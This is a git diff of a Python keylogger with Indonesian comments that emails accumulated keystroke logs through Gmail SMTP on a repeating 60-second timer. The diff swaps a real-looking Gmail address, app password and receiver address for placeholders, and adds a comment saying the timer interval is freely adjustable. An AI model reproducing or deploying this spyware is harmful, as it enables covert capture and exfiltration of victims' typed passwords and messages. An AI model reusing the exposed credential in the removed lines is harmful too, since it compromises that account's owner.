@@ -6,9 +6,9 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # ====== KONFIGURASI EMAIL ======
-EMAIL_USER = "giskaauramp@gmail.com"       # email pengirim
-EMAIL_PASS = "drsylwornvjknltr"            # app password
-EMAIL_RECEIVER = "giska.edtz@gmail.com"    # email penerima
+EMAIL_USER = "youremail@gmail.com"       # email pengirim
+EMAIL_PASS = "youpasssmtp"            # app password
+EMAIL_RECEIVER = "youreemaillog@gmail.com"    # email penerima
 
 log = ""
 
@@ -43,8 +43,9 @@ def send_log():
             print(f"Error sending log: {e}")
 
     log = ""  # reset log setelah kirim
-    Timer(60, send_log).start()  # kirim lagi 60 detik
+    Timer(60, send_log).start()  # kirim lagi 60 detik, bisa diganti angka 60 nya bebas berapa detik
 
 # ====== MULAI ======
 send_log()
 keyboard.wait()
+
